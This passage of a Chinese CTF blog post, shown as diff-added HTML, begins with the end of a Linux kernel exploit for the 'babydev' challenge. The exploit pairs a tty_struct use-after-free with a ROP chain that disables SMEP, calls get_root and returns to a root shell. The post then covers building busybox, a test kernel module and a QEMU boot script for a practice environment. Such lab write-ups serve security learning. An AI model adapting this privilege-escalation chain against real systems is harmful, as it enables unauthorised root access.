+    <span class=n>save_status</span><span class=p>();</span>
+
+    <span class=kt>uint64_t</span> <span class=n>rop</span><span class=p>[</span><span class=mi>30</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span>
+        <span class=mh>0xffffffff810d238d</span><span class=p>,</span>         <span class=c1>// pop rdi ; ret
+</span><span class=c1></span>        <span class=mh>0x6f0</span><span class=p>,</span>
+        <span class=mh>0xffffffff81004d80</span><span class=p>,</span>         <span class=c1>// mov cr4, rdi ; pop rbp ; ret
+</span><span class=c1></span>        <span class=mi>0</span><span class=p>,</span>
+        <span class=n>get_root</span><span class=p>,</span>
+        <span class=mh>0xffffffff81063694</span><span class=p>,</span>         <span class=c1>// swapgs ; pop rbp ; ret
+</span><span class=c1></span>        <span class=mi>0</span><span class=p>,</span>
+        <span class=mh>0xffffffff814ee0a4</span><span class=p>,</span>         <span class=c1>// opcode: 48 cf iretq
+</span><span class=c1></span>    <span class=p>};</span>
+    <span class=n>tf</span><span class=p>.</span><span class=n>rip</span> <span class=o>=</span> <span class=n>get_shell</span><span class=p>;</span>
+    <span class=o>*</span><span class=p>(</span><span class=k>struct</span> <span class=n>trap_frame</span><span class=o>*</span><span class=p>)(</span><span class=o>&amp;</span><span class=n>rop</span><span class=p>[</span><span class=mi>8</span><span class=p>])</span> <span class=o>=</span> <span class=n>tf</span><span class=p>;</span>
+
+    <span class=kt>uint64_t</span> <span class=n>base</span>  <span class=o>=</span> <span class=n>xchgeaxesp</span> <span class=o>&amp;</span> <span class=mh>0xfffff000</span><span class=p>;</span>
+    <span class=n>mmap</span><span class=p>(</span><span class=n>base</span><span class=p>,</span> <span class=mh>0x3000</span><span class=p>,</span> <span class=n>PROT_EXEC</span><span class=o>|</span><span class=n>PROT_WRITE</span><span class=o>|</span><span class=n>PROT_READ</span><span class=p>,</span> <span class=n>MAP_PRIVATE</span><span class=o>|</span><span class=n>MAP_ANONYMOUS</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
+    <span class=n>memcpy</span><span class=p>(</span><span class=n>xchgeaxesp</span><span class=o>&amp;</span><span class=mh>0xffffffff</span><span class=p>,</span> <span class=n>rop</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>rop</span><span class=p>));</span>
+
+    <span class=k>struct</span> <span class=n>tty_operations</span> <span class=n>tty_ops</span> <span class=o>=</span> <span class=p>{</span><span class=mi>0</span><span class=p>};</span>
+    <span class=n>tty_ops</span><span class=p>.</span><span class=n>ioctl</span> <span class=o>=</span> <span class=n>xchgeaxesp</span><span class=p>;</span>
+    <span class=kt>uint64_t</span> <span class=n>fake_tty</span><span class=p>[</span><span class=mi>4</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span><span class=mi>0</span><span class=p>};</span>
+
+    <span class=kt>int</span> <span class=n>fd1</span> <span class=o>=</span> <span class=n>open</span><span class=p>(</span><span class=s>&#34;/dev/babydev&#34;</span><span class=p>,</span> <span class=n>O_RDWR</span><span class=p>);</span>
+    <span class=kt>int</span> <span class=n>fd2</span> <span class=o>=</span> <span class=n>open</span><span class=p>(</span><span class=s>&#34;/dev/babydev&#34;</span><span class=p>,</span> <span class=n>O_RDWR</span><span class=p>);</span>
+    <span class=n>ioctl</span><span class=p>(</span><span class=n>fd1</span><span class=p>,</span> <span class=mh>0x10001</span><span class=p>,</span> <span class=mh>0x2e0</span><span class=p>);</span>
+    <span class=n>close</span><span class=p>(</span><span class=n>fd1</span><span class=p>);</span>
+
+    <span class=kt>int</span> <span class=n>fd_tty</span> <span class=o>=</span> <span class=n>open</span><span class=p>(</span><span class=s>&#34;/dev/ptmx&#34;</span><span class=p>,</span> <span class=n>O_RDWR</span><span class=o>|</span><span class=n>O_NOCTTY</span><span class=p>);</span>
+    <span class=n>read</span><span class=p>(</span><span class=n>fd2</span><span class=p>,</span> <span class=n>fake_tty</span><span class=p>,</span> <span class=mi>32</span><span class=p>);</span>
+    <span class=n>fake_tty</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>tty_ops</span><span class=p>;</span>
+    <span class=n>write</span><span class=p>(</span><span class=n>fd2</span><span class=p>,</span> <span class=n>fake_tty</span><span class=p>,</span> <span class=mi>32</span><span class=p>);</span>
+
+    <span class=n>ioctl</span><span class=p>(</span><span class=n>fd_tty</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>   
+
+    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+<span class=p>}</span>
+</code></pre></td></tr></table>
+</div>
+</div><h2 id=error>ERROR</h2>
+<ul>
+<li>musl-gcc 编译 32bit出错</li>
+<li>ROPgadget 计算jmp relative地址错误</li>
+</ul>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>pwndbg&gt; x/4i 0xffffffff8181bfc5
+   0xffffffff8181bfc5:	mov    rsp,rax
+   0xffffffff8181bfc8:	dec    ebx
+   0xffffffff8181bfca:	jmp    0xffffffff8181bf7e
+   0xffffffff8181bfcc:	nop    DWORD PTR <span class=o>[</span>rax+0x0<span class=o>]</span>
+pwndbg&gt; x/hx 0xffffffff8181bfca
+0xffffffff8181bfca:	0xb2eb
+</code></pre></td></tr></table>
+</div>
+</div><p>ROPgadget所显示的gadget为<code>0xffffffff8181bfc5 : mov rsp, rax ; dec ebx ; jmp 0xffffffff8181bf83</code>。</p>
+<p>从pwndbg得到opcode<code>ebb2</code>，是<code>jmp rel8</code>类型<a href=http://ref.x86asm.net/coder64.html#xEB>ref</a>，八位相对地址跳转<code>b2</code>最高位为1，是负数-0x4e，也就是向低地址跳转，<code>0xffffffff8181bfcc-0x4e = 0xffffffff8181bf7e</code>。</p>
+<blockquote>
+<p>2020-10-30更新</p>
+</blockquote>
+<h2 id=编译加载简单module>编译加载简单module</h2>
+<p>为了方便地获得<code>struct cred</code>和<code>struct tty_struct</code>的大小，编译简单的module。</p>
+<h3 id=1-编译内核>1. 编译内核</h3>
+<p>这里随便用了个版本，实际上应该获取题目内核版本，下载其源码编译。<a href=#jump1>Compile Kernel</a></p>
+<h3 id=2-编译busybox>2. 编译busybox</h3>
+<p>在<a href=https://busybox.net/>官网</a>下载源码。</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>$ bzip2 -d -v busybox-1.32.0.tar.bz2
+$ tar xvf busybox-1.32.0.tar
+$ <span class=nb>cd</span> busybox-1.32.0
+$ make menuconfig    <span class=c1># 进入setting，勾上Build static binary(no shared libs)</span>
+$ make install -j4   <span class=c1># 4是编译线程数，根据情况改</span>
+$ <span class=nb>cd</span> _install
+$ mkdir proc sys
+$ touch init pack
+$ chmod +x init
+$ chmod +x pack
+</code></pre></td></tr></table>
+</div>
+</div><p>在init中写入如下(注意更改模块名称)</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=cp>#!/bin/sh
+</span><span class=cp></span><span class=nb>echo</span> <span class=s2>&#34;{==DBG==} INIT SCRIPT&#34;</span>
+mkdir /tmp
+mount -t proc none /proc
+mount -t sysfs none /sys
+mount -t debugfs none /sys/kernel/debug
+mount -t tmpfs none /tmp
+<span class=c1># insmod /xxx.ko # load ko</span>
+mdev -s <span class=c1># We need this to find /dev/sda later</span>
+<span class=nb>echo</span> -e <span class=s2>&#34;{==DBG==} Boot took </span><span class=k>$(</span>cut -d<span class=s1>&#39; &#39;</span> -f1 /proc/uptime<span class=k>)</span><span class=s2> seconds&#34;</span>
+setsid /bin/cttyhack setuidgid <span class=m>1000</span> /bin/sh <span class=c1>#normal user</span>
+<span class=c1># exec /bin/sh #root</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>在pack里写入打包命令</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=cp>#!/bin/sh
+</span><span class=cp></span><span class=nb>echo</span> <span class=s2>&#34;Generate rootfs.img&#34;</span>
+find . <span class=p>|</span> cpio -o --format<span class=o>=</span>newc &gt; ./rootfs.cpio
+</code></pre></td></tr></table>
+</div>
+</div><h3 id=3-编写编译module>3. 编写编译module</h3>
+<p>在kernel目录下新建文件夹，创建源码文件</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>$ mkdir test_module
+$ <span class=nb>cd</span> test_module
+$ touch hello.c Makefile
+</code></pre></td></tr></table>
+</div>
+</div><p>在hello.c中写入</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=cp>#include</span> <span class=cpf>&lt;linux/init.h&gt;</span><span class=cp>
+</span><span class=cp>#include</span> <span class=cpf>&lt;linux/module.h&gt;</span><span class=cp>
+</span><span class=cp>#include</span> <span class=cpf>&lt;linux/kernel.h&gt;</span><span class=cp>
+</span><span class=cp>#include</span> <span class=cpf>&lt;linux/cred.h&gt;</span><span class=cp>
+</span><span class=cp>#include</span> <span class=cpf>&lt;linux/tty.h&gt;</span><span class=cp>
+</span><span class=cp></span>
+<span class=n>MODULE_LICENSE</span><span class=p>(</span><span class=s>&#34;Dual BSD/GPL&#34;</span><span class=p>);</span>
+
+<span class=k>struct</span> <span class=n>cred</span> <span class=n>c1</span><span class=p>;</span>
+<span class=k>struct</span> <span class=n>tty_struct</span> <span class=n>t1</span><span class=p>;</span>
+
+<span class=k>static</span> <span class=kt>int</span> <span class=nf>hello_init</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
+<span class=p>{</span>
+    <span class=n>printk</span><span class=p>(</span><span class=s>&#34;&lt;1&gt; Hello world!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
+    <span class=n>printk</span><span class=p>(</span><span class=s>&#34;&lt;1&gt; sizeof cred: 0x%lx </span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>c1</span><span class=p>));</span>
+    <span class=n>printk</span><span class=p>(</span><span class=s>&#34;&lt;1&gt; sizeof tty_struct: 0x%lx&#34;</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>t1</span><span class=p>));</span>
+    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+<span class=p>}</span>
+
+<span class=k>static</span> <span class=kt>void</span> <span class=nf>hello_exit</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
+<span class=p>{</span>
+    <span class=n>printk</span><span class=p>(</span><span class=s>&#34;&lt;1&gt; Bye, cruel world</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
+<span class=p>}</span>
+
+<span class=n>module_init</span><span class=p>(</span><span class=n>hello_init</span><span class=p>);</span>
+<span class=n>module_exit</span><span class=p>(</span><span class=n>hello_exit</span><span class=p>);</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>在Makefile中写入</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-makefile data-lang=makefile><span class=nv>obj-m</span> <span class=o>:=</span> hello.o
+
+<span class=nv>KERNELDR</span> <span class=o>:=</span> /home/liu/src/kernel/linux-5.4.72
+
+<span class=nv>PWD</span> <span class=o>:=</span> <span class=k>$(</span>shell <span class=nb>pwd</span><span class=k>)</span>
+
+<span class=nf>modules</span><span class=o>:</span>
+	<span class=k>$(</span>MAKE<span class=k>)</span> -C <span class=k>$(</span>KERNELDR<span class=k>)</span> <span class=nv>M</span><span class=o>=</span><span class=k>$(</span>PWD<span class=k>)</span> modules
+
+<span class=nf>modules_install</span><span class=o>:</span>
+	<span class=k>$(</span>MAKE<span class=k>)</span> -C <span class=k>$(</span>KERNELDR<span class=k>)</span> M-<span class=k>$(</span>PWD<span class=k>)</span> modules_install
+
+<span class=nf>clean</span><span class=o>:</span>
+	rm -rf *.o *~ core .depend .*.cmd *.ko *.mod.c .tmp_versions
+</code></pre></td></tr></table>
+</div>
+</div><p>然后<code>make</code></p>
+<h3 id=4-启动系统>4. 启动系统</h3>
+<p>将hello.ko放入到busybox的_install目录下，使用pack打包。</p>
+<p>将生成的rootfs.cpio，bzImage放在一个文件夹下面，并新建启动脚本<code>boot.sh</code></p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=cp>#!/bin/sh
+</span><span class=cp></span>
+qemu-system-x86_64 <span class=se>\
+</span><span class=se></span>-m 128M <span class=se>\
+</span><span class=se></span>-kernel ./bzImage <span class=se>\
+</span><span class=se></span>-initrd  ./rootfs.cpio <span class=se>\
+</span><span class=se></span>-append <span class=s2>&#34;console=ttyS0 root=/dev/ram oops=panic panic=1 kalsr&#34;</span> <span class=se>\
+</span><span class=se></span>-netdev user,id<span class=o>=</span>t0, -device e1000,netdev<span class=o>=</span>t0,id<span class=o>=</span>nic0 <span class=se>\
+</span><span class=se></span>-monitor /dev/null <span class=se>\
+</span><span class=se></span>--nographic <span class=se>\
+</span><span class=se></span>-smp <span class=nv>cores</span><span class=o>=</span>2,threads<span class=o>=</span><span class=m>1</span> <span class=se>\
+</span><span class=se></span>-cpu kvm64,+smep <span class=se>\
+</span><span class=se></span><span class=c1>#-gdb tcp::1234 \</span>
+<span class=c1>#-S</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>执行boot.sh就可以看到输出的大小了。</p>
+<p><img src=https://raw.githubusercontent.com/clxsh/pics/master/imgmodule_test.png alt></p>
+<h2 id=to-do-list>to do list</h2>
+<ol>
+<li>
+<p><del>如何定位call rax/call [rax+0x38]（tty_operation)</del></p>
+<p>智熄了。。直接看call backtrace。从某个地址向前查看指令，可能会遇到指令不对齐的问题，多试几个数字，直到当前地址的指令显示正确。如地址<code>0xffffffff814dc0c6</code>：</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>pwndbg&gt; x/10i 0xffffffff814dc0c6-1
+   0xffffffff814dc0c5:  cmp    BYTE PTR <span class=o>[</span>rcx+rcx*4-0x9<span class=o>]</span>,cl
+   0xffffffff814dc0c9:  mov    r15d,eax    <span class=c1># 未对齐</span>
+...
+
+pwndbg&gt; x/10i 0xffffffff814dc0c6-2
+   0xffffffff814dc0c4:  push   rax
+   0xffffffff814dc0c5:  cmp    BYTE PTR <span class=o>[</span>rcx+rcx*4-0x9<span class=o>]</span>,cl
+   0xffffffff814dc0c9:  mov    r15d,eax    <span class=c1># 未对齐</span>
+...
+
+pwndbg&gt; x/10i 0xffffffff814dc0c6-3
+   0xffffffff814dc0c3:  call   QWORD PTR <span class=o>[</span>rax+0x38<span class=o>]</span>
+   0xffffffff814dc0c6:  mov    rdi,r14    <span class=c1># 对齐成功</span>
+...
+</code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p><del>struct size 计算。编译简单module <a href=http://myhackerworld.top/2019/01/06/%E5%86%85%E6%A0%B8pwn-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/>ref1</a> <a href=https://www.anquanke.com/post/id/203399#h2-10>ref2</a></del></p>
+</li>
+</ol>
+<h2 id=参考>参考</h2>
+<ol>
+<li><a href=https://www.cyberciti.biz/tips/compiling-linux-kernel-26.html>How to compile and install linux kernel 5.6.9 from souce code?</a></li>
+<li><a href=http://mgalgs.github.io/2012/03/23/how-to-build-a-custom-linux-kernel-for-qemu.html>How to Build A Custom Linux Kernel For Qemu?</a></li>
+<li><a href=https://m4x.fun/post/linux-kernel-pwn-abc-1>Linux Kernel Pwn ABC(Ⅰ)</a></li>
+<li><a href=https://m4x.fun/post/linux-kernel-pwn-abc-2/>Linux Kernel Pwn ABC(II)</a></li>
+<li><a href=https://binlep.github.io/2020/03/12/%E3%80%90Pwn%20%E7%AC%94%E8%AE%B0%E3%80%91Linux%20Kernel%20%E8%B0%83%E8%AF%95%E6%96%87%E4%BB%B6%E6%80%BB%E7%BB%93/>Kernel调试文件总结</a></li>
+<li><a href=https://unix.stackexchange.com/questions/5518/what-is-the-difference-between-the-following-kernel-makefile-terms-vmlinux-vml>What is the difference between the following kernel Makefile terms: vmLinux, vmlinuz, vmlinux.bin, zimage & bzimage?</a></li>
+<li><a href=https://www.anquanke.com/post/id/201043>Kernel Pwn 学习之路(一)</a></li>
+<li><a href=https://stackoverflow.com/questions/11756153/whats-the-difference-between-iret-and-iretd-iretq>what&rsquo;s the difference between iret and iretd,iretq?</a></li>
+<li><a href=http://blog.vmsplice.net/2011/09/how-to-share-files-instantly-between.html>How to share files instantly between virtual machines and host</a></li>
+<li><a href=https://xz.aliyun.com/t/4529>Linux Pwn技巧总结_1 &ndash; V1NKe</a></li>
+<li><a href=https://whereisk0shl.top/NCSTISC%20Linux%20Kernel%20pwn450%20writeup.html>NCSTISC Linux Kernel PWN450 Writeup</a></li>
+<li><a href=http://myhackerworld.top/2019/01/06/%E5%86%85%E6%A0%B8pwn-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/>内核Pwn 环境搭建</a></li>
+</ol>
+</div>
+<div class=post-copyright>
+<p class=copyright-item>
+<span class=item-title>文章作者</span>
+<span class=item-content>hhdx</span>
+</p>
+<p class=copyright-item>
+<span class=item-title>上次更新</span>
+<span class=item-content>
+2020-10-25
+</span>
+</p>
+</div>
+<footer class=post-footer>
+<div class=post-tags>
+<a href=/tags/kernel-pwn/>Kernel Pwn</a>
+<a href=/tags/ctf/>CTF</a>
+</div>
+<nav class=post-nav>
+<a class=prev href=/post/qemu-pwn/>
+<i class="iconfont icon-left"></i>
+<span class="prev-text nav-default">Qemu Escape ---- 以BlizzardCTF2017_STRNG为例</span>
+<span class="prev-text nav-mobile">上一篇</span>
+</a>
+<a class=next href=/post/arm-pwn/>
+<span class="next-text nav-default">Arm Pwn</span>
+<span class="next-text nav-mobile">下一篇</span>
+<i class="iconfont icon-right"></i>
+</a>
+</nav>
+</footer>
+</article>
+</div>
+<div id=disqus_thread></div>
+<script type=text/javascript>(function(){var a,b;if(window.location.hostname==='localhost')return;a=document.createElement('script'),a.type='text/javascript',a.async=!0,b='lyliuchao',a.src='//'+b+'.disqus.com/embed.js',(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(a)})()</script>
+<noscript>Please enable JavaScript to view the <a href=http://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript>
+</div>
+</main>
+<footer id=footer class=footer>
+<div class=social-links>
+<a href=https://github.com/clxsh class="iconfont icon-github" title=github></a>
+<a href=https://www.douban.com/people/57285004/ class="iconfont icon-douban" title=douban></a>
+<a href=https://hhdx.xyz/index.xml type=application/rss+xml class="iconfont icon-rss" title=rss></a>
+</div>
+<div class=copyright>
+<span class=power-by>
+由 <a class=hexo-link href=https://gohugo.io>Hugo</a> 强力驱动
+</span>
+<span class=division>|</span>
+<span class=theme-info>
+主题 -
+<a class=theme-link href=https://github.com/olOwOlo/hugo-theme-even>Even</a>
+</span>
+<span class=copyright-year>
+&copy;
+2016 -
+2021<span class=heart><i class="iconfont icon-heart"></i></span><span>hhdx</span>
+</span>
+</div>
+</footer>
+<div class=back-to-top id=back-to-top>
+<i class="iconfont icon-up"></i>
+</div>
+</div>
+<script src=https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin=anonymous></script>
+<script src=https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin=anonymous></script>
+<script src=https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin=anonymous></script>
+<script type=text/javascript src=/js/main.min.c99b103c33d1539acf3025e1913697534542c4a5aa5af0ccc20475ed2863603b.js></script>
+<script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga('create','UA-177325662-1','auto'),ga('set','anonymizeIp',!0),ga('send','pageview'))</script>
+<script async src=https://www.google-analytics.com/analytics.js></script>
+</body>
+</html>
